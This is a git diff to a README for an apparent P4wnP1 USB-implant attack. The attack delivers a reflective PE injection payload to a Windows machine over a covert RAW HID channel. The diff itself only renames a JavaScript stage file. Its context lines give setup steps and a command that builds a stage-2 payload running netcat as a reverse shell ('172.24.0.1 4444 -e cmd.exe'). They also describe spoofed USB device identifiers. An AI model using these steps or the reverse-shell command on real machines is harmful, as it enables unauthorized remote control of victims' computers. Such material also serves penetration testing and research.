@@ -12,7 +12,7 @@ Use a Covert RAW HID channel to deliver a payload to a windows machine and load 
 - chmod `root@kali:/usr/local/P4wnP1/scripts# chmod 755 Injection.sh`
 - Copy the "**Invoke-ReflectivePEInjection.ps1**" payload to `/usr/local/P4wnP1/legacy/`
 - Copy the "**StageGenerator.py**" script to `/usr/local/P4wnP1/legacy/`
-- Copy the "**Stage1.js**" to `/usr/local/P4wnP1/HIDScripts/`
+- Copy the "**Invoke-ReflectivePEInjection.js**" to `/usr/local/P4wnP1/HIDScripts/`
 - Generate Stage2 payload (netcat Reflective PE Injection) `root@kali:/usr/local/P4wnP1/legacy# python2 StageGenerator.py /usr/share/windows-binaries/nc.exe "172.24.0.1 4444 -e cmd.exe"`
 
 ## Configuration
@@ -27,7 +27,7 @@ Use a Covert RAW HID channel to deliver a payload to a windows machine and load 
 - Product Name: `P4wnP1 by MaMe82`
 - Serial Number: `deadbeef1337`
 
-_If you want to use other VID/PID you will need to update the values in Stage1.js and Stage2.ps1_
+_If you want to use other VID/PID you will need to update the values in Invoke-ReflectivePEInjection.js and Stage2.ps1_
 
 **Store the template under the name "Injection"**
 
